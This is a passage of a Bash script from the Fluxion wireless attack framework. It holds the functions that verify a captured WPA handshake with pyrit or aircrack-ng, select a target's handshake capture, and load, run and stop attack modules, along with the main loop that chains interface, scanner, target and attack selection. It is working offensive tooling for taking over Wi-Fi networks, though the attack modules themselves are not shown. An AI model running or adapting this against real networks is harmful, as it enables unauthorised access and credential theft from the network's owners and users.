	source "lib/ap/$APRogueService.sh"
}

###################################### < Hashes > ######################################
function check_hash() {
	if [ ! -f "$APTargetHashPath" -o ! -s "$APTargetHashPath" ]; then
		echo -e "$FLUXIONVLine $FLUXIONHashFileDoesNotExistError"
		sleep 3
		return 1;
	fi

	fluxion_header

	echo -e "$FLUXIONVLine $FLUXIONHashVerificationMethodQuery"
	echo

	view_target_ap_info

	local choices=("$FLUXIONHashVerificationMethodPyritOption" "$FLUXIONHashVerificationMethodAircrackOption" "$FLUXIONGeneralBackOption")
	io_query_choice "" choices[@]

	echo

	local verifier
	case "$IOQueryChoice" in
		"$FLUXIONHashVerificationMethodPyritOption") verifier="pyrit";;
		"$FLUXIONHashVerificationMethodAircrackOption") verifier="aircrack-ng";;
		"$FLUXIONGeneralBackOption") return 1;;
	esac

	hash_check_handshake "$verifier" "$APTargetHashPath" "$APTargetSSID" "$APTargetMAC" > $FLUXIONOutputDevice
	local hashResult=$?

	# A value other than 0 means there's an issue with the hash.
	if [ $hashResult -ne 0 ]
	then echo -e "$FLUXIONVLine $FLUXIONHashInvalidError"
	else echo -e "$FLUXIONVLine $FLUXIONHashValidNotice"
	fi

	sleep 3

	if [ $hashResult -ne 0 ]; then return 1; fi
}

function set_hash_path() {
	fluxion_header
	echo
	echo -e  "$FLUXIONVLine $FLUXIONPathToHandshakeFileQuery"
	echo
	echo -ne "$FLUXIONAbsolutePathInfo: "
	read APTargetHashPath
}

function unset_hash() {
	APTargetHashPath=""	
}

function set_hash() {
	if [ "$APTargetHashPath" ]; then return 0; fi

	unset_hash

	# Scan for an existing hash for potential use, if one exists,
	# ask the user if we should use it, or to skip it.
	if [ -f "$FLUXIONHashPath/$APTargetSSIDClean-$APTargetMAC.cap" -a \
		 -s "$FLUXIONHashPath/$APTargetSSIDClean-$APTargetMAC.cap" ]; then

		fluxion_header

		echo -e "$FLUXIONVLine $FLUXIONFoundHashNotice"
		echo

		view_target_ap_info

		echo -e  "Path: ${CClr}$FLUXIONHashPath/$APTargetSSIDClean-$APTargetMAC.cap"
		echo -ne "${CRed}$FLUXIONUseFoundHashQuery$CClr [${CWht}Y$CClr/n] "

		if [ ! $FLUXIONAuto ];then
			read APTargetHashPathConsidered
		fi

		if [ "$APTargetHashPathConsidered" = "" -o "$APTargetHashPathConsidered" = "y" -o "$APTargetHashPathConsidered" = "Y" ]; then
			APTargetHashPath="$FLUXIONHashPath/$APTargetSSIDClean-$APTargetMAC.cap"
			check_hash
			# If the user decides to go back, we must unset.
			if [ $? -ne 0 ]; then unset_hash; return 1; fi
		fi
	fi

	# If the hash was not found, or if it was skipped,
	# ask for location or for gathering one.
	while [ ! -f "$APTargetHashPath" -o ! -s "$APTargetHashPath" ]; do
		fluxion_header

		echo -e "$FLUXIONVLine $FLUXIONHashSourceQuery"
		echo

		view_target_ap_info

		local choices=("$FLUXIONHashSourcePathOption" "$FLUXIONHashSourceRescanOption" "$FLUXIONGeneralBackOption")
		io_query_choice "" choices[@]

		echo

		case "$IOQueryChoice" in
			"$FLUXIONHashSourcePathOption") set_hash_path; check_hash;;
			"$FLUXIONHashSourceRescanOption") set_hash;; # Rescan checks hash automatically.
			"$FLUXIONGeneralBackOption" ) unset_hash; return 1;; 
		esac

		# This conditional is required for return values
		# of operation performed in the case statement.
		if [ $? -ne 0 ]; then unset_hash; return 1; fi
	done

	# Copy to workspace for hash-required operations.
	cp "$APTargetHashPath" "$FLUXIONWorkspacePath/$APTargetSSIDClean-$APTargetMAC.cap"
}

###################################### < Attack > ######################################
function unset_attack() {
	if [ "$FLUXIONAttack" ]
	then unprep_attack
	fi
	FLUXIONAttack=""
}

# Select attack strategie that will be used
function set_attack() {
	if [ "$FLUXIONAttack" ]; then return 0; fi

	unset_attack
	
	fluxion_header

	echo -e "$FLUXIONVLine $FLUXIONAttackQuery"
	echo

	view_target_ap_info

	local attacks=(attacks/* "$FLUXIONGeneralBackOption")
	attacks=("${attacks[@]/attacks\//}")
	attacks=("${attacks[@]/.sh/}")

	io_query_choice "" attacks[@]

	echo

	if [ "$IOQueryChoice" = "$FLUXIONGeneralBackOption" ]; then
		unset_target_ap
		unset_attack
		return 1
	fi

	FLUXIONAttack=$IOQueryChoice

	source "attacks/$FLUXIONAttack/attack.sh"

	prep_attack

	if [ $? -ne 0 ]; then
		unset_attack
		return 1
	fi
}

# Attack
function run_attack() {
    start_attack

	local choices=("$FLUXIONSelectAnotherAttackOption" "$FLUXIONGeneralExitOption")
	io_query_choice "`io_dynamic_output $FLUXIONAttackInProgressNotice`" choices[@]

	echo

	# IOQueryChoice is a global, meaning, its value is volatile.
	# We need to make sure to save the choice before it changes.
	local choice="$IOQueryChoice"

	stop_attack

	if [ "$choice" = "$FLUXIONGeneralExitOption" ]; then exitmode; fi

	unset_attack
}

################################### < FLUXION Loop > ###################################
check_dependencies
set_resolution
set_language

while true; do
	set_interface;	if [ $? -ne 0 ]; then continue; fi
	set_scanner;	if [ $? -ne 0 ]; then continue; fi
	set_target_ap;	if [ $? -ne 0 ]; then continue; fi
	set_attack;		if [ $? -ne 0 ]; then continue; fi
	run_attack;		if [ $? -ne 0 ]; then continue; fi
done

# FLUXSCRIPT END
